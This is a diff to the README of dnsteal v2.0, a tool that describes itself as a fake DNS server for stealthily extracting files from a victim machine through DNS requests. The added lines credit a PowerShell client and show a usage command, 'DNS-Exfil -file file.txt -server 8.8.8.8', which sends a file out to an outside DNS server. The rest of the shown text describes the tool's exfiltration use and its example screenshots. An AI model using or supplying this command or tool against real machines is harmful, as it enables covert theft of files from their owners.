@@ -1,5 +1,13 @@
 # dnsteal v 2.0
 
+**Powershell client created by @icyguider. Everything else is from https://github.com/m57/dnsteal with little modification, so all credit to them.**
+
+The powershell client can be used like so once imported:
+
+```powershell
+DNS-Exfil -file file.txt -server 8.8.8.8
+```
+
 This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. 
 
 Below are a couple of different images showing examples of multiple file transfer and single verbose file transfer:
